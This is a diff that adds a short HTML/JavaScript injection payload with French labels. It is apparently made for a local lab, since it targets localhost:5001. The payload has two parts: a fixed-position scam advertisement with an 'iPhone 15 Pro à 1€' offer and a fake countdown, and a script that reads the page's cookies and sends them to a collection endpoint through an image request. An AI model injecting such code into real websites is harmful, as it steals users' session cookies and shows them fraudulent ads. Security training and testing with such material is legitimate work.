@@ -1,0 +1,22 @@
+Injection publicité
+<div id="floating-ad" style="position:fixed;top:20px;right:20px;width:280px;height:200px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px;border-radius:12px;z-index:9999;font-family:Arial;text-align:center;box-shadow:0 8px 25px rgba(0,0,0,0.3);">
+  <h3 style="margin:0 0 10px 0;">🎉 OFFRE FLASH ! 🎉</h3>
+  <p style="margin:5px 0;font-size:14px;">iPhone 15 Pro à 1€ seulement !</p>
+  <p style="margin:5px 0;font-size:12px;opacity:0.9;">Plus que 2h restantes !</p>
+  <button onclick="window.open('http://localhost:5001/ads','_blank')" style="background:#28a745;color:white;border:none;padding:8px 15px;border-radius:20px;cursor:pointer;margin:5px;">
+    🛒 COMMANDER
+  </button>
+  <br>
+  <button onclick="document.getElementById('floating-ad').remove()" style="background:rgba(255,255,255,0.2);color:white;border:1px solid white;padding:4px 8px;border-radius:12px;cursor:pointer;font-size:11px;">
+    ✕ Fermer
+  </button>
+</div>
+
+
+// VOL DE COOKIES
+<script>
+// Vol de cookies simple et direct
+var img = new Image();
+img.src = 'http://localhost:5001/collect?cookies=' + encodeURIComponent(document.cookie);
+console.log('Cookies volés:', document.cookie);
+</script>
